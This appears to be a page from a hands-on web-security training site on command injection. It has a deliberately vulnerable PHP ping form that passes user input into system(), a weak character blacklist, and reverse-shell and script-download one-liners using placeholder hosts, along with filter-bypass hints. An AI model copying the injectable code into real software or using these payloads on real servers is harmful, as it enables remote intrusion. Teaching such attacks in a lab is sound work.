<?php
  if (isset($_GET["ip"])) {
    echo "<div class=\"subpage-container\"><p>Command output:</p>";
    $arg = "-c";
    if (PHP_OS_FAMILY == "Windows") $arg = "-n";

    $ip = $_GET["ip"];

    if ($_GET["prot"] == "bl") {
      if (preg_match('/[;|&><]/', $ip)) {
        echo "<p class=\"red\">Contains prohibited characters</p>";
      } else {
        system("ping {$arg} {$ip}");
      }
    } else {
      system("ping {$arg} {$ip}");
    }

    echo "</div>";
  }
?>


<h2>RCE</h2>

<p>Following up on the previous topic of web shells, let's discuss RCE.</p>

<p>As you probably already know, RCE (Remote Code Execution) is a vulnerability that leads to you being able to execute commands on the remote server - Therefore achieving practically the best state you can be in. The only thing stopping you now are the local privileges. A good web application will be running as unprivileged user. Then, you would need to achieve privilege escalation. If the web server is running as root though (and you can find amateur servers like these), you can do anything you want!</p>

<p>Note: RCE typically refers to the fact that you can execute <b>code</b> on the server (like php code, java code, and such). The state when you can execute commands is called a 'shell'</p>

<h3>Command injection</h3>

<p>When an application executes a CLI command locally AND accepts some form of user input for the command AND echoes its output back to you, then you might be able to perform a command injection.</p>

<p>Our example includes the following code:</p>

<p class="mono">$ip = $_GET["ip"];</p>
<p class="mono">system("ping -c {$ip}");</p>

<p>This expects an ip address in the input (like <span class="mono">127.0.0.1</span>). However, we have control over the raw command line. In command line, there are other characters you can input, not just commands.</p>

<ul>
  <li><p><span class="mono">&gt;</span> for output to file (arbitrary write to anywhere)</p></li>
  <li><p><span class="mono">;</span> for executing multiple commands on single line</p></li>
  <li><p><span class="mono">| && ||</span> for command chaining</p></li>
  <li><p>And others ... - <span class="mono">$(command)</span> or <span class="mono">`command`</span></p></li>
</ul>

<h3>Exploitation</h3>

<p>First let's try the basic example, no protections, just execute (you can use the whoami command as a <a href="https://www.techtarget.com/searchsecurity/definition/proof-of-concept-PoC-exploit" target="_blank">PoC</a>). Just continue as if you wanted to execute another command in the line (use ;, |, &&, doesn't matter)</p>

<div class="subpage-container">
  <p>PING an IP address</p>
  <form action="" method="get">
    <input type="hidden" name="p" value="rce">
    <input type="hidden" name="prot" value="no">
    <label for="ip">IP: </label>
    <input type="text" name="ip" id="ip" placeholder="127.0.0.1" required><br>
    <input type="submit">
  </form>
</div>

<h3>Usual malicious payloads</h3>

<p>A hacker will not be satisfied with this RCE. He wants an interactive shell that he can utilise to its fullest. He might issue commands like these:</p>

<p>Download a bash script from sites like pastebin - the bash script could be very elaborate</p>

<p class="mono">curl -L https://pastebin.com/raw/PASTE_ID -o script.sh</p>

<p>Initiate a reverse shell - The server connects to a listening port on our machine and provides a shell</p>

<p class="mono">bash -i >& /dev/tcp/IP/PORT 0>&1</p>

<p>or a bit more stable (but depends on the <span class="mono">nc</span> command)</p>

<p class="mono">nc IP PORT -e /bin/bash</p>

<h3>Protections</h3>

<p>The best protection would be to use RegEx for validating that the input really is an ip address (a strict RegEx). But other bad alternatives might be used.</p>

<p>Incomplete blacklist: The developer could blacklist characters like ';' and '|', but he can fail to omit '&'. We will not show this in a standalone version, since it is almost too simple. Instead we will have all these characters blacklisted:</p>

<p class="mono">$blacklist = [';', '|', '&', '>', '<']</p>

<p>So what now? There is still a separator the developer forgot about! Can you figure it out? THe answer in base64 is: QSBzaW1wbGUKbmV3bGluZQ==</p>

<p>Note: You will have to URL-encode the character and pass it directly through URL.</p>

<div class="subpage-container">
  <p>Blacklist bypass</p>
  <form action="" method="get">
    <input type="hidden" name="p" value="rce">
    <input type="hidden" name="prot" value="bl">
    <label for="ip">IP: </label>
    <input type="text" name="ip" id="ip" placeholder="127.0.0.1" required><br>
    <input type="submit">
  </form>
</div>

<p>But what if we included all the separators we can think about?</p>

<p>There is a few more tricks up our sleeves - Look back at the list of special characters on this site. There is the option to use backticks or $() to inject command OUTPUT into the command line. We can inject the character ';' in its hex form like this: $(echo -e "\x3b").</p>

<p>The problem is it will not get interpreted. It will be passed as a string. Now is where you have to get creative and where your knowledge will have to shine.</p>

<p>This is a problem that you could see in some CTFs and I will not torture you to find a solution (although you are welcome to try!)</p>

<div class="subpage-container">
  <p>Final `` or $() expansion</p>
  <form action="" method="get">
    <input type="hidden" name="p" value="rce">
    <input type="hidden" name="prot" value="exp">
    <label for="ip">IP: </label>
    <input type="text" name="ip" id="ip" placeholder="127.0.0.1" required><br>
    <input type="submit">
  </form>
</div>

<p>My solution (there may be other solutions) is as follows: To avoid stderr, we have to pass a valid IP address at the end. Up until then we can use series of <span class="mono">eval</span> and <span class="mono">echo</span> statements to bypass shell filters and chain multiple commands.</p>
